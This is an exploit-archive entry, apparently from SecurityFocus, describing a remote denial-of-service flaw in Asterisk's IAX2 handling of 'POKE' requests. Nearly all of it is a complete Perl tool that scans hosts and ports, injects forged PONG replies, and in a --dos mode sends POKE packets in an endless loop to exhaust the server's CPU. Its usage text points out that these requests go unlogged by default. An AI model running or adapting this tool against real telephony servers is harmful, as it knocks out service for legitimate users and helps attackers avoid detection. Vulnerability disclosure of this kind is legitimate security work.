source: http://www.securityfocus.com/bid/30321/info

Asterisk is prone to a remote denial-of-service vulnerability because it fails to handle multiple 'POKE' requests in quick succession.

Attackers can exploit this issue by sending a persistent stream of 'POKE' requests that will consume processor resources and deny service to legitimate users.

NOTE: By default, 'POKE' requests are not logged by Asterisk. 

#!/usr/bin/perl -w
#udp IAX ping discovery and injection tool
#Created: Blake Cornell
#Released under no license, use at your own free will
#
# Do not hesitate to show enthusiasm and support
# 	and help develop this further.

use strict;
use IO::Socket;
use Getopt::Long;
use Net::Subnets;
use Pod::Usage;


my @target_port = (4569);
my @targets = ('127.0.0.1');

my $result = GetOptions('port|p=i' => \(my $port = ''),
			'sport|sp=i' => \(my $sport = ''),
			'eport|ep=i' => \(my $eport = ''),
			'source|sip=s' => \(my $source = ''),
			'host|h=s' => \(my $host = ''),
			'inject|in' => \(my $inject = ''),
			'dos' => \(my $dos = ''),
			'timeout|t=i' => \(my $timeout = ''),
			'dundi-check|dundi' => \(my $dundi = ''),
			'verbose|v' => \(my $verbose = ''),
			'help|?' => \(my $help = '')) or pod2usage(2);

if($help) { printUsage(); }
if($host) { @targets=@{retHosts($host)}; }
if($port) { $target_port[0] = $port; }
if($dundi) { print "DUNDI Option Scan not supported yet."; }
if($source) { print "Setting of the source IP address is only supported 
in inject mode"; }


if($inject) { 
	if($verbose) { print "INJECTION MODE"; }
	if(!@targets) {
		print "\nSet the host ( -h ) option\n";
		return 1;
	}
	for(my $i=20000;$i<=65535;$i++) {
		for(my $j=0;$j<=$#targets;$j++) {
			if($verbose) { print $targets[$j]; }
			injectIAXPoke($targets[$j],$source,$i,0);
		}
	#my($target,$source,$port,$timeout,@args)=@_;
	}
	exit;
}

if($dos) {
	while(1) {
		for(my $j=0;$j<=$#targets;$j++) {
			if($verbose) { print $targets[$j]; }
			dosIAXPoke($targets[$j],4569,$timeout);
		}
		
	}
}

if($sport ne '' && $eport ne '') { #defined doesn't work for getoptions
				#devices are always defined
	if($verbose ne '') { print "Scanning Port Range\n"; }
	if($eport < $sport) {
		my $tmp = $eport;
		$eport = $sport;
		$sport = $tmp;
	}
	if($sport < 1) { $sport = 1; }
	if($eport > 65535) { $eport = 65535; }
	if($timeout ne '' && $verbose ne '') {
		if($timeout <= 0) {
			$timeout = 1;
		}
		print "Scanning Ports $sport through $eport\n";
		print "Setting timeout to $timeout\n";
	}

	@target_port=();
	for(my $i=$sport; $i <= $eport; $i++) {
		push(@target_port,$i);
	}
	sendIAXPokes(\@targets,\@target_port);

}else{	#scanning only default port...
	sendIAXPokes(\@targets,\@target_port);
}

sub sendIAXPokes {
	my($targets_ref,$target_ports_ref,@args)=@_;

	my @targets=@{$targets_ref};
	my @target_ports=@{$target_ports_ref};

	for(my $i=0;$i<=$#targets;$i++) {
		for(my $j=0;$j<=$#target_ports;$j++) {
			
sendIAXPoke($targets[$i],$target_ports[$j],$timeout);
		}
	}
}

sub sendIAXPoke {
	my($target,$port,$timeout,@args)=@_;

	if($verbose) {
		print "Trying $target:$port\n";

	}
	socket(PING, PF_INET, SOCK_DGRAM, getprotobyname("udp"));

	my $src_call = "8000"; 
	my $dst_call = "0000";
	my $timestamp = "00000000";
	my $outbound_seq = "00";
	my $inbound_seq = "00";
	my $type = "06"; #IAX_Control
	my $iax_type = "1e"; #POKE
	my $msg = pack "H24", $src_call . $dst_call . $timestamp . 
$outbound_seq . $inbound_seq . $type . $iax_type;

	my $ipaddr = inet_aton($target);
	my $sin = sockaddr_in($port,$ipaddr);

	send(PING, $msg, 0, $sin) == length($msg) or die "cannot send to 
$target : $port : $!\n";

	my $MAXLEN = 1024;
	my $TIMEOUT = 1;
	if(defined($timeout) && $timeout ne '' && $timeout != 0) { 
#timeout of 0 hangs
								
#unanswered requests
		$TIMEOUT=$timeout;
	}
	eval {
		local $SIG{ALRM} = sub { die "alarm time out"; };
		alarm $TIMEOUT;

		while (1) {
			my $recvfrom = recv(PING, $msg, $MAXLEN, 0) or 
die "recv: $!";
			($port, $ipaddr) = sockaddr_in($recvfrom);
			my $respaddr = inet_ntoa($ipaddr);
			print "Response from $respaddr : $port\n";
			return($respaddr,$port);
		}

	}; 
}

sub injectIAXPoke {
	my($target,$source,$port,$timeout,@args)=@_;

	socket(PING, PF_INET, SOCK_DGRAM, getprotobyname("udp"));

	my $src_call = "8000"; 
	my $dst_call = "0000";
	my $timestamp = "00000000";
	my $outbound_seq = "00";
	my $inbound_seq = "01"; #increment by one did he say?
	my $type = "06"; #IAX_Control
	my $iax_type = "03"; #PONG
	my $msg = pack "H24", $src_call . $dst_call . $timestamp . 
$outbound_seq . $inbound_seq . $type . $iax_type;

	my $targetIP = inet_aton($target);
	my $sin = sockaddr_in($port,$targetIP);

	send(PING, $msg, 0, $sin) == length($msg) or die "cannot send to 
$target : $port : $!\n";
}

sub retHosts {
	my($host,@args)=@_;
	my @addrs;
	
	if(!$host) { return ('127.0.0.1') };

	if($host =~ 
/^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})\/([\d]{1,2})$/ && $1 
>= 0 && $1 <= 255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4 
>= 0 && $4 <= 255) {
					#Check to see if host is valid 
class C CIDR Address
	 	if($verbose) { print "Setting CIDR Address Range\n"; }
		my $sn = Net::Subnets->new;
		
		my($low,$high)=$sn->range(\$host);
		if($verbose) { print "Determined IP Ranges From $$low - 
$$high\n"; }
		return \@{ $sn->list(\($$low,$$high)) };
		
	}elsif($host =~ 
/^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})$/ && $1 >= 0 && $1 <= 
255 && $2 >= 0 && $2 <= 255 && $3 >= 0 && $3 <= 255 && $4 >= 0 && $4 <= 
255)  {
					#Check to see if host is valid 
IP
		push(@addrs,"$1.$2.$3.$4");
	}else{
		push(@addrs,$host);
	}
	return \@addrs;
}

sub dosIAXPoke {
	my($target,$port,$timeout,@args)=@_;

	if($verbose) {
		print "Trying $target:$port\n";

	}
	socket(PING, PF_INET, SOCK_DGRAM, getprotobyname("udp"));

	my $src_call = "8000"; 
	my $dst_call = "0000";
	my $timestamp = "00000000";
	my $outbound_seq = "00";
	my $inbound_seq = "00";
	my $type = "06"; #IAX_Control
	my $iax_type = "1e"; #POKE
	my $msg = pack "H24", $src_call . $dst_call . $timestamp . 
$outbound_seq . $inbound_seq . $type . $iax_type;

	my $ipaddr = inet_aton($target);
	my $sin = sockaddr_in($port,$ipaddr);

	send(PING, $msg, 0, $sin) == length($msg) or die "cannot send to 
$target : $port : $!\n";
}


sub printUsage {
	print "$0 -h remoteorigin.com \n\t\tScans remoteorigin.com on 
default port of 4569\n";
	print "$0 -h remoteorigin.com -sp 4000 -ep 5000\n\t\tScans ports 
4000 through 5000 on server remoteorigin.com\n";
	print "$0 --source remoteorigi.com -h 127.0.0.1 
--inject\n\t\tInjects Forged Poke Replies to 127.0.0.1 from 
remoteorigin.com\n";
	print "$0 --dos\n\t\tThis will continually send IAX Poke 
packets.  This will eat up CPU cycles and isn't logged by default\n";
	exit;
}